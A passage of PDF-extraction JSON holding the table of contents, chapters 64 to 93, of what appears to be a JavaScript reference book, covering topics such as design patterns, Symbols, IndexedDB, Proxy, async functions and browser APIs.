        "img": []
    },
    {
        "text": "Section 64.2: Keeping Compatibility   346",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": " ....................................................................................................................... ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 64.3: Cancelling an Animation   346",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": " .................................................................................................................... ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Chapter 65: Creational Design Patterns   348",
        "font_name": "Quicksand-Bold",
        "font_size": 12,
        "img": []
    },
    {
        "text": " ....................................................................................................... ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 65.1: Factory Functions   348",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": " ................................................................................................................................ ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 65.2: Factory with Composition   349",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": " .................................................................................................................. ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 65.3: Module and Revealing Module Patterns   350",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": " .......................................................................................... ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 65.4: Prototype Pattern   352",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": " ............................................................................................................................... ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 65.5: Singleton Pattern   353",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": " ................................................................................................................................ ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 65.6: Abstract Factory Pattern   354",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": " ................................................................................................................... ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Chapter 66: Detecting browser   355",
        "font_name": "Quicksand-Bold",
        "font_size": 12,
        "img": []
    },
    {
        "text": " ......................................................................................................................... ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 66.1: Feature Detection Method   355",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": " ................................................................................................................. ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 66.2: User Agent Detection   355",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": " ......................................................................................................................... ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 66.3: Library Method   356",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": " ................................................................................................................................... ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Chapter 67: Symbols   357",
        "font_name": "Quicksand-Bold",
        "font_size": 12,
        "img": []
    },
    {
        "text": " ............................................................................................................................................... ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 67.1: Basics of symbol primitive type   357",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": " ......................................................................................................... ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 67.2: Using Symbol.for() to create global, shared symbols   357",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": " .................................................................... ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 67.3: Converting a symbol into a string   357",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": " .................................................................................................... ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Chapter 68: Transpiling   359",
        "font_name": "Quicksand-Bold",
        "font_size": 12,
        "img": []
    },
    {
        "text": " ......................................................................................................................................... ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 68.1: Introduction to Transpiling   359",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": " ................................................................................................................. ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 68.2: Start using ES6/7 with Babel   360",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": " ............................................................................................................. ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Chapter 69: Automatic Semicolon Insertion - ASI   361",
        "font_name": "Quicksand-Bold",
        "font_size": 12,
        "img": []
    },
    {
        "text": " .................................................................................... ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 69.1: Avoid semicolon insertion on return statements   361",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": " ............................................................................. ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 69.2: Rules of Automatic Semicolon Insertion   361",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": " .......................................................................................... ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 69.3: Statements a\ue023ected by automatic semicolon insertion   362",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": " ................................................................ ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Chapter 70: Localization   364",
        "font_name": "Quicksand-Bold",
        "font_size": 12,
        "img": []
    },
    {
        "text": " ....................................................................................................................................... ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 70.1: Number formatting   364",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": " ............................................................................................................................. ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 70.2: Currency formatting   364",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": " .......................................................................................................................... ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 70.3: Date and time formatting   364",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": " .................................................................................................................. ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Chapter 71: Geolocation   365",
        "font_name": "Quicksand-Bold",
        "font_size": 12,
        "img": []
    },
    {
        "text": " ........................................................................................................................................ ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 71.1: Get updates when a user's location changes   365",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": " ................................................................................... ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 71.2: Get a user's latitude and longitude   365",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": " ................................................................................................... ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 71.3: More descriptive error codes   365",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": " ............................................................................................................. ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Chapter 72: IndexedDB   367",
        "font_name": "Quicksand-Bold",
        "font_size": 12,
        "img": []
    },
    {
        "text": " .......................................................................................................................................... ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 72.1: Opening a database   367",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": " ........................................................................................................................... ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 72.2: Adding objects   367",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": " .................................................................................................................................... ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 72.3: Retrieving data   368",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": " ................................................................................................................................... ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 72.4: Testing for IndexedDB availability   369",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": " .................................................................................................... ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Chapter 73: Modularization Techniques   370",
        "font_name": "Quicksand-Bold",
        "font_size": 12,
        "img": []
    },
    {
        "text": " ....................................................................................................... ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 73.1: ES6 Modules  ",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": " ......................................................................................................................................... 370",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 73.2: Universal Module De\ufb01nition (UMD)   370",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": " .................................................................................................. ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 73.3: Immediately invoked function expressions (IIFE)   371",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": " ............................................................................ ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 73.4: Asynchronous Module De\ufb01nition (AMD)   371",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": " .......................................................................................... ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 73.5: CommonJS - Node.js   372",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": " .......................................................................................................................... ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Chapter 74: Proxy   374",
        "font_name": "Quicksand-Bold",
        "font_size": 12,
        "img": []
    },
    {
        "text": " .................................................................................................................................................... ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 74.1: Proxying property lookup   374",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": " .................................................................................................................. ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 74.2: Very simple proxy (using the set trap)   374",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": " ............................................................................................ ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Chapter 75: .postMessage() and MessageEvent   376",
        "font_name": "Quicksand-Bold",
        "font_size": 12,
        "img": []
    },
    {
        "text": " ...................................................................................... ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 75.1: Getting Started   376",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": " .................................................................................................................................... ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Chapter 76: WeakMap   379",
        "font_name": "Quicksand-Bold",
        "font_size": 12,
        "img": []
    },
    {
        "text": " ............................................................................................................................................ ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 76.1: Creating a WeakMap object   379",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": " .............................................................................................................. ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 76.2: Getting a value associated to the key   379",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": " .............................................................................................. ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 76.3: Assigning a value to the key   379",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": " ............................................................................................................. ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 76.4: Checking if an element with the key exists   379",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": " ...................................................................................... ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 76.5: Removing an element with the key   380",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": " .................................................................................................. ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 76.6: Weak reference demo   380",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": " ....................................................................................................................... ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Chapter 77: WeakSet   382",
        "font_name": "Quicksand-Bold",
        "font_size": 12,
        "img": []
    },
    {
        "text": " .............................................................................................................................................. ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 77.1: Creating a WeakSet object   382",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": " ................................................................................................................ ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 77.2: Adding a value   382",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": " .................................................................................................................................... ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 77.3: Checking if a value exists   382",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": " ................................................................................................................... ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 77.4: Removing a value   382",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": " ............................................................................................................................... ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Chapter 78: Escape Sequences   383",
        "font_name": "Quicksand-Bold",
        "font_size": 12,
        "img": []
    },
    {
        "text": " ......................................................................................................................... ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 78.1: Entering special characters in strings and regular expressions   383",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": " .................................................... ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 78.2: Escape sequence types   383",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": " ..................................................................................................................... ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Chapter 79: Behavioral Design Patterns   386",
        "font_name": "Quicksand-Bold",
        "font_size": 12,
        "img": []
    },
    {
        "text": " ...................................................................................................... ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 79.1: Observer pattern   386",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": " ................................................................................................................................. ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 79.2: Mediator Pattern   387",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": " ................................................................................................................................ ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 79.3: Command   388",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": " ............................................................................................................................................ ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 79.4: Iterator   389",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": " ................................................................................................................................................. ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Chapter 80: Server-sent events   391",
        "font_name": "Quicksand-Bold",
        "font_size": 12,
        "img": []
    },
    {
        "text": " ........................................................................................................................ ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 80.1: Setting up a basic event stream to the server   391",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": " ................................................................................. ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 80.2: Closing an event stream   391",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": " ................................................................................................................... ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 80.3: Binding event listeners to EventSource   391",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": " ........................................................................................... ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Chapter 81: Async functions (async/await)   393",
        "font_name": "Quicksand-Bold",
        "font_size": 12,
        "img": []
    },
    {
        "text": " ................................................................................................ ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 81.1: Introduction   393",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": " .......................................................................................................................................... ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 81.2: Await and operator precedence   393",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": " ....................................................................................................... ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 81.3: Async functions compared to Promises   394",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": " ........................................................................................... ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 81.4: Looping with async await   395",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": " ................................................................................................................... ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 81.5: Less indentation   396",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": " .................................................................................................................................. ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 81.6: Simultaneous async (parallel) operations   397",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": " ........................................................................................ ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Chapter 82: Async Iterators   398",
        "font_name": "Quicksand-Bold",
        "font_size": 12,
        "img": []
    },
    {
        "text": " ................................................................................................................................ ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 82.1: Basics   398",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": " ................................................................................................................................................... ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Chapter 83: How to make iterator usable inside async callback function   399",
        "font_name": "Quicksand-Bold",
        "font_size": 12,
        "img": []
    },
    {
        "text": " ................................. ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 83.1: Erroneous code, can you spot why this usage of key will lead to bugs?   399",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": " ...................................... ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 83.2: Correct Writing   399",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": " ................................................................................................................................... ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Chapter 84: Tail Call Optimization   400",
        "font_name": "Quicksand-Bold",
        "font_size": 12,
        "img": []
    },
    {
        "text": " .................................................................................................................. ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 84.1: What is Tail Call Optimization (TCO)   400",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": " ................................................................................................ ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 84.2: Recursive loops ",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": " .................................................................................................................................. 400",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Chapter 85: Bitwise Operators - Real World Examples (snippets)   401",
        "font_name": "Quicksand-Bold",
        "font_size": 12,
        "img": []
    },
    {
        "text": " ................................................. ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 85.1: Swapping Two Integers with Bitwise XOR (without additional memory allocation)   401",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": " .................... ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 85.2: Faster multiplication or division by powers of 2   401",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": " ............................................................................. ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 85.3: Number's Parity Detection with Bitwise AND   401",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": " .................................................................................. ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Chapter 86: Tilde ~   403",
        "font_name": "Quicksand-Bold",
        "font_size": 12,
        "img": []
    },
    {
        "text": " ................................................................................................................................................... ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 86.1: ~ Integer   403",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": " ............................................................................................................................................... ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 86.2: ~~ Operator   403",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": " ......................................................................................................................................... ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 86.3: Converting Non-numeric values to Numbers   404",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": " .................................................................................. ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 86.4: Shorthands   404",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": " .......................................................................................................................................... ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 86.5: ~ Decimal   404",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": " ............................................................................................................................................. ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Chapter 87: Using JavaScript to get/set CSS custom variables   406",
        "font_name": "Quicksand-Bold",
        "font_size": 12,
        "img": []
    },
    {
        "text": " ..................................................... ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 87.1: How to get and set CSS variable property values   406",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": " ........................................................................... ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Chapter 88: Selection API   407",
        "font_name": "Quicksand-Bold",
        "font_size": 12,
        "img": []
    },
    {
        "text": " ..................................................................................................................................... ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 88.1: Get the text of the selection   407",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": " ............................................................................................................... ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 88.2: Deselect everything that is selected   407",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": " ................................................................................................ ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 88.3: Select the contents of an element   407",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": " .................................................................................................... ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Chapter 89: File API, Blobs and FileReaders   408",
        "font_name": "Quicksand-Bold",
        "font_size": 12,
        "img": []
    },
    {
        "text": " ............................................................................................... ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 89.1: Read \ufb01le as string   408",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": " ............................................................................................................................... ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 89.2: Read \ufb01le as dataURL   408",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": " ......................................................................................................................... ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 89.3: Slice a \ufb01le   409",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": " ............................................................................................................................................. ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 89.4: Get the properties of the \ufb01le   409",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": " ............................................................................................................. ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 89.5: Selecting multiple \ufb01les and restricting \ufb01le types   410",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": " ............................................................................. ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 89.6: Client side csv download using Blob   410",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": " ................................................................................................ ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Chapter 90: Noti\ufb01cations API   411",
        "font_name": "Quicksand-Bold",
        "font_size": 12,
        "img": []
    },
    {
        "text": " ............................................................................................................................. ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 90.1: Requesting Permission to send noti\ufb01cations   411",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": " ................................................................................... ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 90.2: Sending Noti\ufb01cations   411",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": " ......................................................................................................................... ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 90.3: Closing a noti\ufb01cation   411",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": " ......................................................................................................................... ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 90.4: Noti\ufb01cation events   412",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": " ............................................................................................................................. ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Chapter 91: Vibration API   413",
        "font_name": "Quicksand-Bold",
        "font_size": 12,
        "img": []
    },
    {
        "text": " ...................................................................................................................................... ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 91.1: Single vibration   413",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": " ..................................................................................................................................... ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 91.2: Check for support   413",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": " ............................................................................................................................... ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 91.3: Vibration patterns   413",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": " ............................................................................................................................... ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Chapter 92: Battery Status API   414",
        "font_name": "Quicksand-Bold",
        "font_size": 12,
        "img": []
    },
    {
        "text": " ......................................................................................................................... ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 92.1: Battery Events   414",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": " ..................................................................................................................................... ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 92.2: Getting current battery level   414",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": " ............................................................................................................. ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 92.3: Is battery charging?   414",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": " ........................................................................................................................... ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 92.4: Get time left until battery is empty   414",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": " ................................................................................................... ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 92.5: Get time left until battery is fully charged   414",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": " ....................................................................................... ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Chapter 93: Fluent API   415",
        "font_name": "Quicksand-Bold",
        "font_size": 12,
        "img": []
    },
    {
        "text": " ............................................................................................................................................ ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
